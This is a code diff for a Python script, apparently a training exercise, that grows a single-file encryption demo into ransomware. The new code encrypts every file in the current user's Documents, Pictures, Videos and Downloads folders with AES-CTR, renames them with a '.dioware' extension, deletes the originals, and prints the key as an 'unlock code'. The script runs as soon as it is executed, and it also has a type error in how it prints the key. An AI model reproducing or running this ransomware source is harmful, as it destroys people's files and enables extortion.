@@ -1,24 +1,44 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def generate_random_iv():
+    number = os.urandom(16)
+    print("Codigo de desbloqueio: "+number)
+    return number
 
-## remover o arquivo
-os.remove(file_name)
+def encrypt_file(file_path, key):
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        aes = pyaes.AESModeOfOperationCTR(key)
+        crypto_data = aes.encrypt(file_data)
+        new_file_name = f"{file_path}.dioware"
+        with open(new_file_name, 'wb') as new_file:
+            new_file.write(crypto_data)
+        os.remove(file_path)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+        print(f"Arquivo criptografado com sucesso: {new_file_name}")
+    except Exception as e:
+        print(f"Erro ao criptografar o arquivo {file_path}: {e}")
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+def encrypt_user_directories(username):
+    directories_to_encrypt = [
+        f"C:/Users/{username}/Documents",
+        f"C:/Users/{username}/Pictures",
+        f"C:/Users/{username}/Videos",
+        f"C:/Users/{username}/Downloads"
+    ]
+    
+    key = generate_random_iv()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    for directory in directories_to_encrypt:
+        if os.path.exists(directory):
+            for root, dirs, files in os.walk(directory):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    encrypt_file(file_path, key)
+        else:
+            print(f"Diretório não encontrado: {directory}")
+
+username = os.getlogin()
+encrypt_user_directories(username)
